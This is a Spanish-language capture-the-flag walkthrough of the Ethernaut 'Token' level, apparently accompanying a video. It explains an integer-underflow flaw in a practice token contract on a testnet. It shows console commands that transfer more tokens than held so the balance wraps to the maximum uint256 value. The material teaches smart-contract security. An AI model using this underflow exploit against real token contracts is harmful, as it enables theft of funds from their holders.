# Token

> Estas son las instrucciones en las que se basan este vídeo:

<p align="center">
  <a href="https://www.youtube.com/watch?v=808VLPbSXI0">
    <img src="https://img.youtube.com/vi/808VLPbSXI0/hqdefault.jpg" alt="Link al video de Youtube">
  </a>
</p>

En este nivel nuestro objetivo es **hackear** un _Smart Contract_ de un **token básico**. Al principio, **nos dan 20 tokens** y tenemos que buscar una manera de **conseguir más**.

Obtenemos una nueva [instancia](https://sepolia.etherscan.io/tx/0xa6be77dba4333ae500d1d44a4b09028e39da7391e8063a2b6a5c700b911c0017) del contrato confirmando la transacción en nuestra billetera de _MetaMask_.

Como pista, nos pregunta qué es un **odómetro**, que si no lo sabes es un **instrumento de medición** que calcula la distancia total, por ejemplo en un coche. Esto puede ser una similitud a una variable, ya que también se puede desbordar. Esto significa que cuando llega al número máximo, vuelve a cero.

## Análisis

Ahora, analicemos el contrato, primero, se almacenan los balances asociando una dirección en un `mapping`. Luego, se establece el `totalSupply` en el `constructor`.

La primera función, `transfer()`, nos permite **mover una cantidad de tokens** a una dirección de destino, siempre y cuando tengamos ese balance.

La otra función, `balanceOf()`, nos permite **consultar el balance** de una cuenta.

El fallo, es que **está utilizando variables** de tipo `uint` para almacenar estos valores y esto es **vulnerable a ataques de desbordamiento de variable**.

## Ataque

Antes de comenzar, vamos a **comprobar el balance de nuestra cuenta**:

```jsx
> await contract.balanceOf(player)
i {negative: 0, words: Array(2), length: 1, red: null}
length: 1
negative: 0
red: null
words: (2) [20, empty]
[[Prototype]]: Object
```

Podemos ver que **tenemos 20 tokens**. Para desbordar esta variable, lo único que tenemos que hacer es **transferir más tokens de los que tenemos para darle la vuelta al contador**.

```jsx
> await contract.transfer("0x2292cE7b1f57a6b91C76cF4dF75C449Ad48cceba", 21)
{tx: '0x47aed38bf4e2823561d69da3c24a998e0a1ad68853b4f6d092d3e696fcfa3325', receipt: {…}, logs: Array(0)}
logs: []
receipt:
{blockHash: '0x30d152d9747b71456a33e95aa982faea36939ca408cdd1275f52548404efd6e8', blockNumber: 5661716, contractAddress: null, cumulativeGasUsed: 2636873, effectiveGasPrice: 2201498470, …}
tx: "0x47aed38bf4e2823561d69da3c24a998e0a1ad68853b4f6d092d3e696fcfa3325"
```

Aceptamos la [transacción](https://sepolia.etherscan.io/tx/0x5e719babf226a17c4cd54421dc6a9d0660fd91f596111fdb59bf762b651d75c3) en _MetaMask_ y cuando se confirme la transacción, consultaremos de nuevo nuestro balance de esta forma:

```jsx
x = await contract.balanceOf(player);
x.toString();
("115792089237316195423570985008687907853269984665640564039457584007913129639935");
```

Ahora ya podemos [enviar](https://sepolia.etherscan.io/tx/0x54be7fbf4736319b23da45a742749d0686a0906ba9eb72950e4c30c043658a24) el nivel!
